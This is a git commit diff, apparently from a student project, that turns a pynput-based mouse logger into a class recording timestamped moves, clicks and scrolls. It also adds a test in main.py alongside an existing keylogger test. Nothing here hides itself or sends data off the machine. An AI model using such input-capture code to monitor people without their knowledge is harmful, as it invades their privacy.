a7b1ce66eb38ae63ef4dfb0e70d91e9740069303
Menchit-ai <thomas.menchi@edu.esiee.fr>
2020-05-29 15:47:53 +0200

    mouselogger classe

--- Mouselogger.py
+++ Mouselogger.py
@@ -1,38 +1,40 @@
 import pynput
-import time
 from pynput.mouse import Button,Listener
+from datetime import datetime
 
-def on_move(x,y):
-    write_file_move(x,y)
+class Mouselog:
+    def __init__(self):
+        self.move = []
+        self.clic = []
+        self.scroll = []
 
-def on_click(x,y,button,pressed):
-    if pressed:
-        write_file_clicked(x,y,button)
-    if not pressed:
-        #Stop Monitoring the mouse
-        return False
+        def on_move(x,y):
+            log = str(datetime.now().time()) + " " + str((x,y))
+            self.move.append(log)
 
+        def on_click(x,y,button,pressed):
+            log = str(datetime.now().time()) + " " + str((x,y))
+            self.clic.append(log)
 
-def on_scroll(x,y,dx,dy):
-    write_file_scrolled(x,y,dx,dy)
+        def on_scroll(x,y,dx,dy):
+            log = str(datetime.now().time()) + " " + str((x,y,dx,dy))
+            self.scroll.append(log)
 
-
-
-def write_file_move(x,y):
-    with open("log_mouse.txt",'a') as f:
-        f.write("Mouse moved to ({0}, {1}) \n".format(x, y))
-
-def write_file_clicked(x,y,button):
-    with open("log_mouse.txt",'a') as f:
-        f.write('Mouse clicked at ({0}, {1}) with {2} \n'.format(x, y, button))
-
-def write_file_scrolled(x,y,dx,dy):
-    with open("log_mouse.txt",'a') as f:
-        f.write('Mouse scrolled at ({0}, {1})({2}, {3}) \n'.format(x, y, dx, dy))
+        self.listener = Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
 
 
+    def mouseLogger():
+        with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
+            listener.join()
 
-def mouseLogger():
-    with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
-        listener.join()
+    def start(self):
+        """
+        permet de démarrer le mouselogger
+        """
+        self.listener.start()
 
+    def stop(self):
+        """
+        permet d'arrêter le mouselogger
+        """
+        self.listener.stop()
--- main.py
+++ main.py
@@ -2,19 +2,29 @@ import keylog
 import time
 #import getImage
 #import getSound
-#import Mouselogger
+import Mouselogger
 
 def main():
 
-    test_keylog()
+    #test_keylog(1)
+    test_mouselog(1)
 
 
-def test_keylog():
+def test_keylog(waittime):
     klog = keylog.KeyLogger()
     klog.start()
-    time.sleep(5)
+    time.sleep(waittime)
     klog.stop()
     print(klog.keys)
+
+def test_mouselog(waittime):
+    mlog = Mouselogger.Mouselog()
+    mlog.start()
+    time.sleep(waittime)
+    mlog.stop()
+    print(mlog.move)
+    print(mlog.clic)
+    print(mlog.scroll)
 
 
 if __name__ == "__main__":
